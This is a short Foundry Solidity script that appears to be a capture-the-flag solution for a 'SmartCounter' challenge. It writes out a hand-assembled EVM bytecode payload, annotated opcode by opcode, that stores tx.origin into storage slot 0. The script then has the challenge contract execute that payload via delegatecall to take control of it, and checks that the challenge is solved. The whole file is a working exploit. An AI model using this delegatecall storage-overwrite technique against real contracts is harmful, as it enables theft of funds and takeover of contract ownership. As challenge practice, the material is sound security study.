// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/counter/Counter.sol";

contract Counter is Script {
    address contractAddress = vm.envAddress("CONTRACT_ADDRESS");
    uint256 playerKey = vm.envUint("PRIVATE_KEY");

    SmartCounter challengeContract;

    function setUp() public {
        challengeContract = new SmartCounter(address(this));
    }

    function run() public {
        // 6080 6040 52 : Setup free memory pointer
        // 32 push tx.origin to stack
        // 60 00 push 00 to stack
        // 55 SSTORE (stores tx.origin in slot 0)
        // 00 STOP
        bytes memory payload = hex"60806040523260005500";
        vm.startBroadcast(playerKey);
        challengeContract.create(payload);
        challengeContract.A_delegateccall("");
        require(challengeContract.isSolved(), "challenge not solved");
    }
}
